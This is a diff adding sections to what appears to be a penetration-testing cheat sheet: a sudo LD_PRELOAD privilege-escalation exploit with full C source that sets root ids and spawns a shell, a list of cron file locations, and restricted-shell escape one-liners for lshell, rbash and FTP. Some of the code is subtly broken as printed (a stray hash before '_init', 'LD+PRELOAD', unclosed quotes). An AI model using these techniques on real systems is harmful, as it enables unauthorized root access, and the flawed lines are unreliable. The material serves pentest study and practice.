@@ -557,6 +557,42 @@ Execute allowed sudo binary for a user other than ``root`` user:
 # sudo -u <USERNAME> <BINARY>
 ```
 
+##
+
+Sudo ``LD_PRELOAD`` Privilege Escalation:
+
+```
+# sudo -l 
+```
+
+If somehow ``env_keep+=LD+PRELOAD`` is in the output, simply create a ``C`` file with following content ``shell.c``:
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+```
+
+Then, hit:
+
+```
+# gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+Run the exploit:
+
+```
+# sudo LD_PRELOAD=/home/<USER>/shell.so apache2
+```
+
+##
+
 Check SUID allowed binaries:
 
 ```
@@ -582,7 +618,17 @@ Find all files belonging to a specific user:
 Always check CRONJOBS:
 
 ```
-# cat /etc/crontab
+# /etc/cron*
+# /etc/init.d
+# /etc/crontab                <- System wide cron job
+# /etc/cron.allow
+# /etc/cron.d
+# /etc/cron.daily
+# /etc/cron.hourly
+# /etc/cron.monthly
+# /etc/cron.weekly
+# /var/spool/cron             <- User crontabs
+# /var/spool/cron/crontabs    <- User crontabs
 ```
 
 Always check ``history`` and ``.bash_history``:
@@ -651,7 +697,77 @@ Check exploits for running services:
 # ps aux | grep root
 ```
 
+Restricted shell escape techniques:
 
+First, get your restricted shell type by hitting: ``$SHELL`` or ``$0``
+
+For ``lshell``:
+
+```
+# echo os.system('/bin/bash')
+```
+
+```
+# echo "#!/bin/bash" > shell.sh
+# echo "/bin/bash" >> shell.sh
+# echo'/shell.sh'
+```
+
+```
+# echo "#!/bin/bash" > shell.sh
+# echo "/bin/bash" >> shell.sh
+# echo^Khohoho/shell.sh
+```
+
+```
+# echo "$(bash 1>&2)"
+```
+
+```
+# echo <CTRL+V> <CTRL+J>
+# bash
+```
+
+```
+# ?
+cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo
+# ll non-existent-dir || 'bash'
+```
+
+```
+# echo () bash && echo
+``` 
+
+```
+# echo<CTRL+V><CTRL+I>() bash && echo
+```
+
+```
+# echo FREEDOM! && help () bash && help 
+FREEDOM!
+```
+
+##
+
+For ``rbash``:
+
+```
+# python -c 'import pty;pty.spawn("/bin/bash")
+
+or
+
+# python3 -c 'import pty;pty.spawn("/bin/bash")
+```
+
+From FTP:
+
+```
+ftp > !/bin/sh
+
+or
+
+ftp > !/bin/bash
+```
 
 -------------------------------------------------------------
 
